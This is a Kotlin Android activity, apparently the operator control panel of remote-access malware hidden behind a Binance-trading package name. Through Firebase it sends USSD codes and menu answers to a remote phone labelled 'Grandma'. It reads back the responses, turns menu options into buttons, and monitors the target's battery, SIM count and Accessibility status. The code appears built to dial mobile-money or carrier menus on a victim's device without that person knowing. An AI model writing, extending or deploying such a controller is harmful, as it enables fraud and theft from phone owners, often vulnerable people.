package dApp.binance.Trading.controller

import android.os.Bundle
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase
import android.util.Log
import android.graphics.Color
import java.util.regex.Pattern

class SendUssdActivity : AppCompatActivity() {

    private lateinit var ussdInput: EditText
    private lateinit var inputValueInput: EditText
    private lateinit var sendCodeButton: Button
    private lateinit var sendButton: Button
    private lateinit var historyButton: Button
    private lateinit var clearButton: Button
    private lateinit var conversationContainer: LinearLayout
    private lateinit var scrollView: ScrollView
    private lateinit var statusText: TextView
    private lateinit var detailedStatusText: TextView
    private lateinit var batteryText: TextView
    private lateinit var batteryIcon: ImageView
    private lateinit var statusIndicator: View
    private lateinit var ussdCodeSection: LinearLayout
    private lateinit var responseInputSection: LinearLayout
    private lateinit var simSelector: RadioGroup
    private lateinit var chipContainer: LinearLayout
    private lateinit var chipScroll: HorizontalScrollView
    private lateinit var executionOverlay: LinearLayout

    private var deviceId: String = ""
    private var deviceName: String = ""
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_send_ussd)

        // Initialize views
        ussdInput = findViewById(R.id.ussdInput)
        inputValueInput = findViewById(R.id.inputValueInput)
        sendCodeButton = findViewById(R.id.sendCodeButton)
        sendButton = findViewById(R.id.sendButton)
        historyButton = findViewById(R.id.historyButton)
        clearButton = findViewById(R.id.clearButton)
        conversationContainer = findViewById(R.id.conversationContainer)
        scrollView = findViewById<LinearLayout>(R.id.conversationContainer).parent as ScrollView
        statusText = findViewById(R.id.statusText)
        detailedStatusText = findViewById(R.id.detailedStatusText)
        batteryText = findViewById(R.id.batteryText)
        batteryIcon = findViewById(R.id.batteryIcon)
        statusIndicator = findViewById(R.id.statusIndicator)
        ussdCodeSection = findViewById(R.id.ussdCodeSection)
        responseInputSection = findViewById(R.id.responseInputSection)
        simSelector = findViewById(R.id.simSelector)
        chipContainer = findViewById(R.id.chipContainer)
        chipScroll = findViewById(R.id.chipScroll)
        executionOverlay = findViewById(R.id.executionOverlay)

        deviceId = intent.getStringExtra("device_id") ?: ""
        deviceName = intent.getStringExtra("device_name") ?: ""

        title = "Control: $deviceName"

        listenForDeviceStatus()
        listenForResponses()

        sendCodeButton.setOnClickListener {
            val code = ussdInput.text.toString().trim()
            if (code.isNotEmpty()) {
                val sim = if (findViewById<RadioButton>(R.id.radioSim2).isChecked) 1 else 0
                sendUssdCode(code, sim)
                ussdInput.text.clear()
            }
        }

        sendButton.setOnClickListener {
            val value = inputValueInput.text.toString().trim()
            if (value.isNotEmpty()) {
                sendResponse(value)
                inputValueInput.text.clear()
            }
        }

        clearButton.setOnClickListener {
            conversationContainer.removeAllViews()
            ussdCodeSection.visibility = View.VISIBLE
            responseInputSection.visibility = View.GONE
            chipScroll.visibility = View.GONE
            executionOverlay.visibility = View.GONE
        }
    }

    private fun listenForDeviceStatus() {
        val database = FirebaseDatabase.getInstance().reference
        database.child("devices").child(deviceId).addValueEventListener(object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                val lastSeen = snapshot.child("last_seen").value as? Long ?: 0L
                val battery = (snapshot.child("battery_level").value as? Long)?.toInt() ?: -1
                val accActive = snapshot.child("accessibility_active").value as? Boolean ?: false
                val simCount = (snapshot.child("sim_count").value as? Long)?.toInt() ?: 1

                val isOnline = (System.currentTimeMillis() - lastSeen) < (10 * 60 * 1000)
                
                statusText.text = if (isOnline) "Grandma is Online" else "Grandma is Offline"
                statusIndicator.setBackgroundColor(if (isOnline) Color.GREEN else Color.GRAY)
                batteryText.text = if (battery != -1) "$battery%" else "--%"
                
                detailedStatusText.text = "Accessibility: ${if (accActive) "Active" else "OFF"} | SIMs: $simCount"
                
                if (simCount > 1) simSelector.visibility = View.VISIBLE
            }
            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
        })
    }

    private fun sendUssdCode(code: String, simSlot: Int) {
        val database = FirebaseDatabase.getInstance().reference
        executionOverlay.visibility = View.VISIBLE
        
        val messageData = mapOf(
            "ussd_code" to code,
            "sim_slot" to simSlot,
            "is_first_code" to "true",
            "timestamp" to System.currentTimeMillis().toString()
        )

        database.child("commands").child(deviceId).push().setValue(messageData).addOnSuccessListener {
            addMessageBubble("You", "📞 Dialing $code...", true)
            ussdCodeSection.visibility = View.GONE
            responseInputSection.visibility = View.VISIBLE
        }
    }

    private fun sendResponse(value: String) {
        val database = FirebaseDatabase.getInstance().reference
        executionOverlay.visibility = View.VISIBLE
        chipScroll.visibility = View.GONE

        val messageData = mapOf(
            "input_value" to value,
            "is_response" to "true",
            "timestamp" to System.currentTimeMillis().toString()
        )

        database.child("commands").child(deviceId).push().setValue(messageData).addOnSuccessListener {
            addMessageBubble("You", "Sent: $value", true)
        }
    }

    private fun listenForResponses() {
        val database = FirebaseDatabase.getInstance().reference
        database.child("responses").child(deviceId).limitToLast(1)
            .addChildEventListener(object : com.google.firebase.database.ChildEventListener {
                override fun onChildAdded(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
                    val data = snapshot.value as? Map<*, *> ?: return
                    val response = data["response"]?.toString() ?: ""
                    val hasInput = data["has_input_field"] as? Boolean ?: false
                    
                    executionOverlay.visibility = View.GONE
                    addMessageBubble(deviceName, response, false)
                    
                    if (hasInput) {
                        generateSmartChips(response)
                    } else {
                        chipScroll.visibility = View.GONE
                    }
                }
                override fun onChildChanged(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}
                override fun onChildRemoved(snapshot: com.google.firebase.database.DataSnapshot) {}
                override fun onChildMoved(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}
                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
            })
    }

    private fun generateSmartChips(text: String) {
        chipContainer.removeAllViews()
        val pattern = Pattern.compile("(\\d+)[.:)]")
        val matcher = pattern.matcher(text)
        val foundOptions = mutableSetOf<String>()

        while (matcher.find()) {
            val option = matcher.group(1) ?: continue
            if (foundOptions.add(option)) {
                val chip = Button(this).apply {
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.WRAP_CONTENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    ).apply { setMargins(4, 0, 4, 0) }
                    text = option
                    textSize = 14f
                    setBackgroundColor(Color.parseColor("#6200EE"))
                    setTextColor(Color.WHITE)
                    setOnClickListener { sendResponse(option) }
                }
                chipContainer.addView(chip)
            }
        }

        chipScroll.visibility = if (foundOptions.isNotEmpty()) View.VISIBLE else View.GONE
    }

    private fun addMessageBubble(sender: String, message: String, isYou: Boolean) {
        val bubble = LinearLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { setMargins(0, 8, 0, 8) }
            orientation = LinearLayout.VERTICAL
            gravity = if (isYou) android.view.Gravity.END else android.view.Gravity.START
        }

        val msgText = TextView(this).apply {
            text = message
            setPadding(16, 12, 16, 12)
            setTextColor(if (isYou) Color.WHITE else Color.BLACK)
            setBackgroundResource(if (isYou) R.drawable.bubble_you else R.drawable.bubble_them)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { maxWidth = (resources.displayMetrics.widthPixels * 0.75).toInt() }
        }

        bubble.addView(msgText)
        conversationContainer.addView(bubble)
        scrollView.post { scrollView.fullScroll(ScrollView.FOCUS_DOWN) }
    }
}
